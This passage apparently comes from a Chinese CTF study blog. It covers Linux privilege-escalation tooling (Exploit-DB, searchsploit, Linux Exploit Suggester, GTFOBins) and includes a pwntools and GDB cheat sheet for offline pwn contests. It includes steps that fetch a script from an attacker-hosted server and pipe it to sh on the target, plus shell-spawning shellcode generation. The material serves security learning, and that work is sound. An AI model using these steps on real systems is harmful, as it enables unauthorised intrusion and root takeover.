Escalation)”。</p></li><li><p><strong>作者备注</strong>：开发者通常会写明这个漏洞是在什么环境下测试成功的。</p></li></ul><p><strong>3.漏洞分析报告</strong></p><p>有些复杂的 CVE 会配有一份 <strong>PDF 或文本报告</strong>。</p><ul><li><strong>作用</strong>：详细解释原理，甚至手把手教你如何搭建一个一模一样的靶机环境来复现。</li></ul><h3 id="如何使用EDB"><a href="#如何使用EDB" class="headerlink" title="如何使用EDB"></a>如何使用EDB</h3><p>一般每个exp都会有脚本或者单独的TXT文件，如果有txt文件，使用方法一般在txt文件，否则就在脚本注释里</p><p><strong>示例</strong>：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Linux Kernel 4.x - &#x27;PwnKit&#x27;</span></span><br><span class="line"><span class="comment"># Usage: python3 exploit.py &lt;target_ip&gt;</span></span><br><span class="line"><span class="comment"># Requirement: Need standard user access</span></span><br></pre></td></tr></table></figure><h3 id="如何本地部署EDB"><a href="#如何本地部署EDB" class="headerlink" title="如何本地部署EDB"></a>如何本地部署EDB</h3><p>在断网或物理隔离的比赛（如 ISW）中，无法访问官网(咱们上面给出的URL)，因此必须提前进行本地部署。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载 Exploit-DB 完整仓库（包含搜索工具和几万个脚本）</span></span><br><span class="line"><span class="built_in">sudo</span> git <span class="built_in">clone</span> https://github.com/offensive-security/exploitdb.git</span><br></pre></td></tr></table></figure><p><img data-src="/images/ISW/Linux提权/0/EDB.png" alt="EDB"></p><p>在这里我们看到和EDB配套的searchsploit已经下载好了，我们可以把它放到<code>/usr/local/bin</code>里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建软链接</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit</span><br></pre></td></tr></table></figure><h2 id="searchsploit-搜索EXP"><a href="#searchsploit-搜索EXP" class="headerlink" title="searchsploit(搜索EXP)"></a>searchsploit(搜索EXP)</h2><p><code>searchsploit</code>是一个快速查找我们EDB里存放exp（包含系统内核漏洞和软件漏洞）的小工具，下面给出<code>searchsploit</code>的使用方法</p><p><strong>如果忘记使用方法就输入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -h</span><br></pre></td></tr></table></figure><p>文档里都详细记载了，不过平时记住核心使用方法最好</p><h3 id="核心基础命令"><a href="#核心基础命令" class="headerlink" title="核心基础命令"></a>核心基础命令</h3><div class="table-container"><table><thead><tr><th>功能</th><th>命令格式</th><th>说明</th></tr></thead><tbody><tr><td><strong>基础搜索</strong></td><td><code>searchsploit &lt;关键字&gt;</code></td><td>搜索包含该关键字的所有漏洞。</td></tr><tr><td><strong>查代码</strong></td><td><code>searchsploit -x &lt;ID&gt;</code></td><td><strong>最常用</strong>。直接在终端里阅读脚本内容/注释。</td></tr><tr><td><strong>拷贝代码</strong></td><td><code>searchsploit -m &lt;ID&gt;</code></td><td>将对应的脚本拷贝到你当前的工作目录下。</td></tr><tr><td><strong>查路径</strong></td><td><code>searchsploit -p &lt;ID&gt;</code></td><td>显示脚本在本地的绝对路径。</td></tr></tbody></table></div><p>例如：</p><p><img data-src="/images/ISW/Linux提权/0/searchsploit.png" alt="searchsploit"></p><p>命令里对应的<ID>就是PATH里的数字命名序号</p><h3 id="更新与维护"><a href="#更新与维护" class="headerlink" title="更新与维护"></a>更新与维护</h3><p>由于我们是使用 <code>git clone</code> 安装的，<code>searchsploit -u</code> 有时会报错。 <strong>推荐更新方式：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/exploitdb</span><br><span class="line"><span class="built_in">sudo</span> git pull</span><br></pre></td></tr></table></figure><p><strong>离线搜索的本质</strong>：它搜索的是 <code>/opt/exploitdb/files_exploits.csv</code> 这个索引文件。</p><p><strong>文件位置</strong>：脚本都在 <code>/opt/exploitdb/exploits/</code> 目录下</p><h2 id="Linux-Exploit-Suggester-寻找当前系统内核有什么漏洞"><a href="#Linux-Exploit-Suggester-寻找当前系统内核有什么漏洞" class="headerlink" title="Linux Exploit Suggester(寻找当前系统内核有什么漏洞)"></a>Linux Exploit Suggester(寻找当前系统内核有什么漏洞)</h2><p>Linux Exploit Suggester 是一个根据内核版本号（<code>uname -a</code>）来预测可能存在的 CVE 漏洞的脚本。</p><p>实战建议先跑这个看看有没有内核漏洞，如果全是低危或者没有，那只能查服务器上运行了什么服务，然后用searchsploit查软件漏洞，如果软件也没有漏洞，只能手打了（查suid之类的）</p><h3 id="下载命令："><a href="#下载命令：" class="headerlink" title="下载命令："></a>下载命令：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</span><br><span class="line"><span class="built_in">chmod</span> +x linux-exploit-suggester.sh</span><br><span class="line"><span class="comment"># 改一个缩写名，到时候用的时候好打</span></span><br><span class="line"><span class="built_in">mv</span> linux-exploit-suggester.sh les.sh</span><br></pre></td></tr></table></figure><h3 id="如何在把这个工具送到靶机："><a href="#如何在把这个工具送到靶机：" class="headerlink" title="如何在把这个工具送到靶机："></a>如何在把这个工具送到靶机：</h3><ol><li><p><strong>攻击机</strong>到对应文件夹开启服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br><span class="line"><span class="comment">#把当前目录变成http服务器的根目录</span></span><br></pre></td></tr></table></figure></li><li><p><strong>靶机</strong> 下载执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://&lt;你的IP&gt;/les.sh </span><br><span class="line"><span class="comment">#或者 ，靶机直接用curl ip/目录 | sh 就能用了</span></span><br><span class="line">bash les.sh</span><br></pre></td></tr></table></figure></li></ol><h3 id="运行结果："><a href="#运行结果：" class="headerlink" title="运行结果："></a>运行结果：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">s0m1ng@LAPTOP-EV3HBGTC:~/ISW_Workspace/Tools/Linux$ ./les.sh</span><br><span class="line"></span><br><span class="line">Available information:</span><br><span class="line"></span><br><span class="line">Kernel version: 6.6.87.2</span><br><span class="line">Architecture: x86_64</span><br><span class="line">Distribution: N/A</span><br><span class="line">Distribution version: N/A</span><br><span class="line">Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed</span><br><span class="line">Package listing: N/A</span><br><span class="line"></span><br><span class="line">Searching among:</span><br><span class="line"></span><br><span class="line">86 kernel space exploits</span><br><span class="line">0 user space exploits</span><br><span class="line"></span><br><span class="line">Possible Exploits:</span><br><span class="line"></span><br><span class="line">[+] [CVE-2022-2586] nft_object UAF</span><br><span class="line"></span><br><span class="line">   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: ubuntu=(20.04)&#123;kernel:5.12.13&#125;</span><br><span class="line">   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1</span><br><span class="line">   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)</span><br><span class="line"></span><br><span class="line">[+] [CVE-2021-22555] Netfilter heap out-of-bounds write</span><br><span class="line"></span><br><span class="line">   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: ubuntu=20.04&#123;kernel:5.8.0-*&#125;</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c</span><br><span class="line">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c</span><br><span class="line">   Comments: ip_tables kernel module must be loaded</span><br><span class="line"></span><br><span class="line">s0m1ng@LAPTOP-EV3HBGTC:~/ISW_Workspace/Tools/Linux$</span><br></pre></td></tr></table></figure><p><strong>Exposure (可能性)</strong>:</p><ul><li><p><code>highly probable</code>: <strong>高概率成功</strong>，优先尝试。</p></li><li><p><code>probable</code>: 可能成功。</p></li><li><p><code>less probable</code>: 可能性较低。</p></li></ul><p><strong>Download URL / EDB-ID</strong>:看到这个后，你就可以用你的 <code>searchsploit</code>里拿EXP了。</p><h2 id="Linpeas"><a href="#Linpeas" class="headerlink" title="Linpeas"></a>Linpeas</h2><p>作用是快速收集系统信息，和les一样他也会查可能存在的漏洞，不过输出更详细，具体使用放在<a href="/2026/03/15/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%831_%E6%9C%AC%E5%9C%B0%E6%9E%9A%E4%B8%BE%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8C%87%E5%8D%97/" title="Linux提权1：本地枚举与信息收集标准工作流 (SOP)">Linux提权1</a>了</p><h2 id="GTFOBins"><a href="#GTFOBins" class="headerlink" title="GTFOBins"></a>GTFOBins</h2><p><strong>GTFOBins</strong> 是一个开源的、精心收集的提权清单集合。它的全称有点抽象（Get The Fuck Out Bins），意为“逃逸出二进制程序的限制”。</p><h3 id="核心原理：合法功能的滥用"><a href="#核心原理：合法功能的滥用" class="headerlink" title="核心原理：合法功能的滥用"></a>核心原理：合法功能的滥用</h3><p>系统里有很多自带的合法程序（比如用来查找文件的 <code>find</code>，用来编辑文本的 <code>vim</code>，用来打包的 <code>tar</code>）。如果管理员为了方便，给这些普通程序赋予了 <strong>SUID（超级用户执行权限）</strong>，或者允许你通过 <strong>Sudo（免密执行）</strong> 运行它们，那我们就可以利用这些程序本身自带的“执行系统命令”或“读取文件”的功能，来弹出一个 root 权限的 Shell。</p><h3 id="它与-Exploit-DB-的本质区别"><a href="#它与-Exploit-DB-的本质区别" class="headerlink" title="它与 Exploit-DB 的本质区别"></a>它与 Exploit-DB 的本质区别</h3><p>这两者同为提权知识库，区别在于：</p><p><strong>Exploit-DB</strong>：针对的是软件 <strong>代码层面的 Bug</strong>（比如缓冲区溢出、内核条件竞争）。你需要编译运行一段 C 语言代码来攻击它。</p><p><strong>GTFOBins</strong>：针对的是系统 <strong>人为配置层面的失误</strong>。这里的程序没有任何 Bug，我们只是在<strong>巧妙利用</strong>它的正常功能来提权</p><h3 id="下载到本地方法："><a href="#下载到本地方法：" class="headerlink" title="下载到本地方法："></a>下载到本地方法：</h3><p>这个和EDB不同，他是一个网页类型的知识库</p><p><strong>不过我们要注意：不要直接去 GitHub 下载 ZIP</strong> GTFOBins 官网是用 Jekyll 生成的动态博客。如果你直接在 GitHub 上点击 <code>Download ZIP</code>，你下载到的只是 Markdown 源码。Windows 浏览器无法直接渲染 Jekyll 引擎，双击打开后排版会全乱，且搜索框完全失效。</p><p>下面给出正确下载方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> wget -r -p -k -E -np -nH https://gtfobins.org/</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p GTFOBins</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> index.html assets gtfobins api.json GTFOBins/</span><br></pre></td></tr></table></figure><p>然后我们</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">explorer.exe gtfobins.github.io</span><br></pre></td></tr></table></figure><p>就可以在windows本地打开这个网站了</p><p>注意：我这里用的是wsl，所以可以用explorer.exe命令，如果是vmware的话直接在对应浏览器打开gtfobins.github.io里的html就行了</p><h3 id="基础用法："><a href="#基础用法：" class="headerlink" title="基础用法："></a>基础用法：</h3><p>直接在搜索框搜索对应命令即可拿到linux命令可能的提权用法</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是Linux提权&quot;&gt;&lt;a href=&quot;#什么是Linux提权&quot; class=&quot;headerlink&quot; title=&quot;什么是Linux提权&quot;&gt;&lt;/a&gt;什么是Linux提权&lt;/h1&gt;&lt;p&gt;权限提升（Privilege escalation）是指利用网络或应用软件中</summary>
      
    
    
    
    <category term="ISW" scheme="http://example.com/categories/ISW/"/>
    
    <category term="Linux提权" scheme="http://example.com/categories/ISW/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="http://example.com/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="基础知识" scheme="http://example.com/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>线下赛知识查询</title>
    <link href="http://example.com/2026/03/15/PWN/pwn_attack/PWN%E9%80%9A%E7%94%A8%E9%97%AE%E9%A2%98/%E6%96%AD%E7%BD%91%E5%90%8E%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%9F%A5%E8%AF%A2/"/>
    <id>http://example.com/2026/03/15/PWN/pwn_attack/PWN%E9%80%9A%E7%94%A8%E9%97%AE%E9%A2%98/%E6%96%AD%E7%BD%91%E5%90%8E%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%9F%A5%E8%AF%A2/</id>
    <published>2026-03-14T16:00:00.000Z</published>
    <updated>2026-03-14T13:47:58.372Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>线下赛一般都断网，这里总结一些会用到的知识</p><h1 id="Linux-底层函数查阅指南"><a href="#Linux-底层函数查阅指南" class="headerlink" title="Linux 底层函数查阅指南"></a>Linux 底层函数查阅指南</h1><p>如果忘记了某个系统调用或 C 库函数（比如 <code>puts</code> 是遇到 <code>\x00</code> 停还是 <code>\n</code> 停？<code>read</code> 的参数顺序是什么？）</p><p>用Linux 自带的查询命令：<strong><code>man</code> (Manual) 手册</strong>。</p><h2 id="核心命令速查"><a href="#核心命令速查" class="headerlink" title="核心命令速查"></a>核心命令速查</h2><p><strong>查 C 语言标准库函数（第 3 章）</strong>：<br>    man 3 puts     # 查 puts 的用法、返回值、截断机制<br>    man 3 printf   # 查格式化字符串</p><p>关于函数到底怎么处理数据的核心逻辑，写在 man 手册最开头的 <strong><code>DESCRIPTION</code> (描述)</strong> 部分里。</p><p><strong>查底层系统调用（第 2 章）</strong>：在手搓 Shellcode 或 Ret2syscall 时必用。<br>    man 2 read     # 查 read 系统调用<br>    man 2 execve   # 查启动 shell 的核心调用</p><h2 id="Man-手册快捷键-Vim-逻辑"><a href="#Man-手册快捷键-Vim-逻辑" class="headerlink" title="Man 手册快捷键 (Vim 逻辑)"></a>Man 手册快捷键 (Vim 逻辑)</h2><ul><li><p><code>j</code> / <code>k</code>：上下滚动一行</p></li><li><p><code>Space</code> (空格)：向下翻一页</p></li><li><p><code>/关键字</code>：全文搜索（例如 <code>/return value</code> 找返回值说明），按 <code>n</code> 找下一个，<code>N</code> 找上一个。</p></li><li><p><code>q</code>：退出手册。</p></li></ul><h1 id="Pwntools"><a href="#Pwntools" class="headerlink" title="Pwntools"></a>Pwntools</h1><p>以下核心模板，能覆盖 90% 的常规题型。</p><h2 id="环境与连接初始化"><a href="#环境与连接初始化" class="headerlink" title="环境与连接初始化"></a>环境与连接初始化</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 极其重要：设置目标架构和操作系统，这会影响后续的汇编、打包解包操作！</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) <span class="comment"># 开启 debug 可见所有收发细节</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地调试与远程连接</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)       # 启动本地进程</span></span><br><span class="line">io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8888</span>) <span class="comment"># 连接远程靶机</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)            <span class="comment"># 加载本地 ELF，用于获取 plt/got 和符号</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)      <span class="comment"># 加载本地指定的 Libc</span></span><br></pre></td></tr></table></figure><h2 id="交互与发包-极其容易踩坑"><a href="#交互与发包-极其容易踩坑" class="headerlink" title="交互与发包 (极其容易踩坑)"></a>交互与发包 (极其容易踩坑)</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># --- 发送 ---</span></span><br><span class="line">io.send(payload)       <span class="comment"># 纯净发送，不附加任何东西（泄露地址、覆盖 Canary 最低位时必用！）</span></span><br><span class="line">io.sendline(payload)   <span class="comment"># 发送并在末尾追加 \n (0x0a)</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;xxx&#x27;</span>, payload)     <span class="comment"># 接收到特定字符串后再发送</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;xxx&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 接收 ---</span></span><br><span class="line">io.recv(n)             <span class="comment"># 严格接收 n 个字节</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;xxx&#x27;</span>)   <span class="comment"># 一直接收并丢弃，直到遇到特定字符串为止（过滤垃圾数据神技！）</span></span><br><span class="line">io.recvall()           <span class="comment"># 接收直到连接关闭</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 终极一跃 ---</span></span><br><span class="line">io.interactive()       <span class="comment"># 将控制权交还给用户，享受你的 Shell！</span></span><br></pre></td></tr></table></figure><h2 id="数据转换与打包-大小端转换"><a href="#数据转换与打包-大小端转换" class="headerlink" title="数据转换与打包 (大小端转换)"></a>数据转换与打包 (大小端转换)</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将数字打包成字节流 (Little-Endian 小端序)</span></span><br><span class="line">p32(<span class="number">0xdeadbeef</span>)        <span class="comment"># 32 位打包：b&#x27;\xef\xbe\xad\xde&#x27;</span></span><br><span class="line">p64(<span class="number">0xdeadbeef</span>)        <span class="comment"># 64 位打包：b&#x27;\xef\xbe\xad\xde\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字节流解包成数字 (泄露地址时必用)</span></span><br><span class="line"><span class="comment"># 注意：64位下泄露的地址通常只有 6 字节，需要用 \x00 在高位补齐 8 字节！</span></span><br><span class="line">leak_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="ELF-与-Libc-快捷搜索"><a href="#ELF-与-Libc-快捷搜索" class="headerlink" title="ELF 与 Libc 快捷搜索"></a>ELF 与 Libc 快捷搜索</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ELF 对象神器</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]      <span class="comment"># 获取 puts 在 PLT 表的地址</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]      <span class="comment"># 获取 puts 在 GOT 表的地址</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>] <span class="comment"># 获取 main 函数真实地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Libc 对象神器 (需先计算出 libc_base)</span></span><br><span class="line">libc.address = libc_base        <span class="comment"># 给 libc 对象设置基址后，下面所有的 sym 都会自动加上基址！</span></span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>] </span><br><span class="line">binsh_addr = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) <span class="comment"># 搜索字符串地址</span></span><br></pre></td></tr></table></figure><h2 id="系统调用与-Shellcode-asm-amp-shellcraft"><a href="#系统调用与-Shellcode-asm-amp-shellcraft" class="headerlink" title="系统调用与 Shellcode (asm &amp; shellcraft)"></a>系统调用与 Shellcode (asm &amp; shellcraft)</h2><p>在打 <code>ret2syscall</code> 或需要手写系统调用时，不再需要死记硬背 <code>execve</code> 的调用号了，Pwntools 提供了一键生成与查询：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取系统调用号 (根据开头的 context.arch 自动适配 32位/64位)</span></span><br><span class="line">sys_execve_num = constants.SYS_execve</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;execve 的系统调用号是: <span class="subst">&#123;sys_execve_num&#125;</span>&quot;</span>) <span class="comment"># 32位是 11，64位是 59</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 手写汇编转机器码 (自动替换宏)</span></span><br><span class="line">assembly = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Pwntools 甚至支持直接在汇编里写系统调用名字 */</span></span><br><span class="line"><span class="string">    mov eax, SYS_execve </span></span><br><span class="line"><span class="string">    mov ebx, 0x0804a020 /* 假设这是 /bin/sh 的地址 */</span></span><br><span class="line"><span class="string">    mov ecx, 0</span></span><br><span class="line"><span class="string">    mov edx, 0</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">machine_code = asm(assembly)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 终极偷懒：一键生成 execve(&quot;/bin/sh&quot;, 0, 0) 的拿 Shell 机器码！</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># 或者更具体的生成：</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.execve(&#x27;/bin/sh&#x27;, 0, 0))</span></span><br><span class="line"></span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="GDB-Pwndbg-动态调试真经"><a href="#GDB-Pwndbg-动态调试真经" class="headerlink" title="GDB-Pwndbg 动态调试真经"></a>GDB-Pwndbg 动态调试真经</h1><h2 id="将-GDB-挂载到-Python-脚本中"><a href="#将-GDB-挂载到-Python-脚本中" class="headerlink" title="将 GDB 挂载到 Python 脚本中"></a>将 GDB 挂载到 Python 脚本中</h2><p>Pwntools 提供了两种极其方便的挂载方式：</p><p><strong>方式一：<code>gdb.attach()</code> (中途挂载，最常用)</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># 先进行一些无关紧要的交互</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;name&#x27;</span>, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在发送致命 payload 前，把 GDB 挂载上去，并下断点</span></span><br><span class="line">gdb.attach(io, <span class="string">&#x27;b main\nb *0x401234&#x27;</span>) </span><br><span class="line">pause() <span class="comment"># 暂停脚本，此时终端会弹出 GDB 窗口。你在 GDB 里调试好后，在脚本按回车才会继续发包。</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><p><strong>方式二：<code>gdb.debug()</code> (启动即挂载)</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接以 GDB 调试模式启动进程</span></span><br><span class="line">io = gdb.debug(<span class="string">&#x27;./vuln&#x27;</span>, <span class="string">&#x27;b main\nc&#x27;</span>) </span><br></pre></td></tr></table></figure><h2 id="执行控制与断点配置"><a href="#执行控制与断点配置" class="headerlink" title="执行控制与断点配置"></a>执行控制与断点配置</h2><h3 id="基础步进"><a href="#基础步进" class="headerlink" title="基础步进"></a>基础步进</h3><p><code>c</code> (continue)：一直运行，直到遇到下一个断点或程序崩溃（SIGSEGV）。</p><p><code>n</code> (next)：源码级单步步过（不进入子函数）。</p><p><code>s</code> (step)：源码级单步步入（会跟进子函数）。</p><p><code>ni</code> / <code>si</code>：<strong>汇编级</strong>单步步过 / 步入（次执行一条汇编指令，不漏过任何寄存器变化）。</p><p><code>fin</code> (finish)：直接执行完当前函数并返回。</p><h3 id="断点管理"><a href="#断点管理" class="headerlink" title="断点管理"></a>断点管理</h3><p><code>b main</code>：给特定函数名下断点。</p><p><code>b *0x401234</code>：给绝对内存地址下断点（注意前面的星号 <code>*</code> 绝对不能漏！）。</p><p><code>b *$rebase(0x1234)</code>：<strong>PIE 开启时的神技！</strong> 给相对偏移下断点，Pwndbg 会自动帮你加上本次运行的随机化基址。</p><p><code>info b</code>：查看当前所有断点状态。</p><p><code>del 1</code>：删除编号为 1 的断点。</p><p><code>watch *0x404040</code>：内存硬件断点（极其好用），只要这个内存地址里的值被修改，程序立刻断下！</p><h2 id="内存观测与数据修改"><a href="#内存观测与数据修改" class="headerlink" title="内存观测与数据修改"></a>内存观测与数据修改</h2><p><strong>万能的 <code>x</code> 命令 (Examine)</strong> 格式：<code>x/&lt;数量&gt;&lt;格式&gt;&lt;大小&gt; &lt;地址/寄存器&gt;</code></p><ul><li><p><code>x/10gx $rsp</code>：以十六进制 (<code>x</code>)、8字节 (<code>g</code>) 为单位，打印栈顶 (<code>$rsp</code>) 往下的 10 个数据。</p></li><li><p><code>x/10wx $ebp-0x10</code>：以十六进制 (<code>x</code>)、4字节 (<code>w</code>) 为单位，打印指定地址数据。</p></li><li><p><code>x/s 0x402000</code>：把该地址的数据当作<strong>字符串</strong>打印出来（检查 <code>/bin/sh</code> 是否写入成功）。</p></li><li><p><code>x/20i $rip</code>：把当前指令指针往后的 20 个字节当作<strong>汇编指令</strong>反汇编出来。</p></li></ul><p><strong>修改寄存器/内存</strong></p><ul><li><p><code>set $rax = 0</code>：强行把 rax 寄存器的值改为 0（常用于绕过条件判断）。</p></li><li><p><code>set *0x404040 = 0x1234</code>：强行向内存地址写入指定值。</p></li></ul><h2 id="Pwndbg-实战专属技巧"><a href="#Pwndbg-实战专属技巧" class="headerlink" title="Pwndbg 实战专属技巧"></a>Pwndbg 实战专属技巧</h2><ul><li><p><strong>全景视角：<code>context</code></strong> 如果你清屏了或者界面乱了，直接输入 <code>context</code> 可以立刻重新唤出 Pwndbg 的四大面板（寄存器区、反汇编区、源码区、栈区）。</p></li><li><p><strong>内存权限雷达：<code>vmmap</code></strong> 